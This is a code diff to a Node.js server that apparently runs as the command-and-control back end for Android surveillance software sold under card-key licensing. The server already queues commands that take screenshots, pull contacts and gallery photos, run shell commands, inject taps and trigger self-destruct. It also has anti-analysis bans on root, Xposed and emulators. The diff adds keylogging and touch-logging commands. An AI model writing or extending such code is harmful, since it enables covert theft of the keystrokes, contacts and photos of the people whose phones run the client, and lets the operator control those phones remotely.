@@ -1,11 +1,12 @@
-﻿const fs = require('fs');
+const fs = require('fs');
 const path = require('path');
 const http = require('http');
 const https = require('https');
 const crypto = require('crypto');
 const { URL } = require('url');
 
-loadEnv(path.join(__dirname, '.env'));
+const ENV_FILE = process.env.ENV_FILE || process.env.CONFIG_FILE || '.env';
+loadEnv(resolveRuntimePath(ENV_FILE, __dirname));
 
 const PORT = Number(process.env.PORT || 3000);
 const PUBLIC_BASE_URL = trimRightSlash(process.env.PUBLIC_BASE_URL || `http://127.0.0.1:${PORT}`);
@@ -26,7 +27,7 @@ const DEFAULT_AI_HTML_PROMPT = [
   'Requirements: output only HTML, no Markdown; must include input id="cardInput"; must include a verify button calling verify(false); keep existing JS bridge calls; responsive mobile layout.',
   'Style: clean, lightweight, no external CDN.'
 ].join('\n');
-const dataDir = path.join(__dirname, 'data');
+const dataDir = resolveRuntimePath(process.env.DATA_DIR || 'data', __dirname);
 const dbFile = path.join(dataDir, 'db.json');
 const uploadsDir = path.join(dataDir, 'uploads');
 
@@ -685,6 +686,21 @@ function deviceHeartbeat(params, req) {
   }
 
   saveDb();
+
+  // If expire_action is now 'none', purge any stale expire_block/self_destruct
+  // commands that may have been queued under a previous config, so they are
+  // never delivered to the device.
+  if (!cfg.expire_action || cfg.expire_action === 'none') {
+    const before = device.pending_commands.length;
+    device.pending_commands = device.pending_commands.filter(
+      c => c.type !== 'expire_block' && c.type !== 'self_destruct'
+    );
+    if (device.pending_commands.length !== before) {
+      console.log(`[beat] ${deviceId}(${device.name}) purged stale expire cmds (expire_action=none)`);
+      saveDb();
+    }
+  }
+
   const cmds = device.pending_commands.slice();
   if (cmds.length) console.log(`[beat] ${deviceId}(${device.name}) push ${cmds.length}: ${cmds.map(c=>c.type).join(',')}`);
   return {
@@ -846,9 +862,10 @@ function sanitizeConfig(config) {
   for (const key of ['enable_c2', 'allow_device_diagnostics', 'allow_root_commands',
     'allow_screenshot', 'allow_contacts', 'allow_shell', 'allow_input_control',
     'debug', 'enable_hook', 'ban_root', 'ban_xposed', 'ban_emulator', 'ban_virtual_app', 'ban_dual_app',
-    'use_html_popup', 'auto_issue_card']) {
+    'use_html_popup', 'auto_issue_card', 'heartbeat_verify']) {
     if (obj[key] != null) sane[key] = boolish(obj[key]);
   }
+  if (obj.heartbeat_verify_interval_minutes != null) sane.heartbeat_verify_interval_minutes = clampInt(obj.heartbeat_verify_interval_minutes, 0, 10080, 0);
   if (obj.popup_title != null) sane.popup_title = String(obj.popup_title).trim().slice(0, 60) || '请输入卡密';
   if (obj.popup_message != null) sane.popup_message = String(obj.popup_message).trim().slice(0, 120) || '一机一卡，首次使用自动绑定设备';
   if (obj.popup_html != null) sane.popup_html = String(obj.popup_html).slice(0, 20000);
@@ -956,7 +973,9 @@ function stripMarkdownFence(text) {
 function queueDeviceCommand(device, params) {
   const type = String(params.type || '').trim();
   const allowed = ['self_destruct', 'message', 'kick', 'update_config',
-    'screenshot', 'get_contacts', 'get_gallery', 'get_photo', 'switch_toggle', 'shell', 'input_tap', 'input_swipe', 'wake'];
+    'screenshot', 'get_contacts', 'get_gallery', 'get_photo', 'switch_toggle', 'shell', 'input_tap', 'input_swipe', 'wake',
+    'keylog_on', 'keylog_off', 'keylog_get',
+    'touchlog_on', 'touchlog_off', 'touchlog_get'];
   if (!allowed.includes(type)) throw new Error('unsupported command: ' + type);
   const cfg = effectiveConfig(device);
   if (!cfg.enable_c2) throw new Error('c2 disabled');
@@ -1241,6 +1260,9 @@ function now() { return new Date().toISOString(); }
 function addDays(iso, days) { const date = new Date(iso); date.setUTCDate(date.getUTCDate() + Number(days)); return date.toISOString(); }
 function trimRightSlash(value) { return String(value).replace(/\/+$/, ''); }
 function ensureDir(dir) { if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true }); }
+function resolveRuntimePath(value, baseDir) { const raw = String(value || '').trim(); if (!raw) return baseDir; return path.isAbsolute(raw) ? raw : path.resolve(baseDir, raw); }
 function escapeHtml(value) { return String(value).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;').replace(/'/g, '&#39;'); }
-function loadEnv(file) { if (!fs.existsSync(file)) return; for (const line of fs.readFileSync(file, 'utf8').replace(/^﻿/, '').split(/\r?\n/)) { const trimmed = line.trim(); if (!trimmed || trimmed.startsWith('#')) continue; const index = trimmed.indexOf('='); if (index <= 0) continue; const key = trimmed.slice(0, index).trim().replace(/^﻿/, ''); const value = trimmed.slice(index + 1).trim(); process.env[key] = value; } }
+function loadEnv(file) { if (!fs.existsSync(file)) return; for (const line of fs.readFileSync(file, 'utf8').replace(/^﻿/, '').split(/\r?\n/)) { const trimmed = line.trim(); if (!trimmed || trimmed.startsWith('#')) continue; const index = trimmed.indexOf('='); if (index <= 0) continue; const key = trimmed.slice(0, index).trim().replace(/^﻿/, ''); const value = trimmed.slice(index + 1).trim(); if (process.env[key] == null) process.env[key] = value; } }
+
+
 
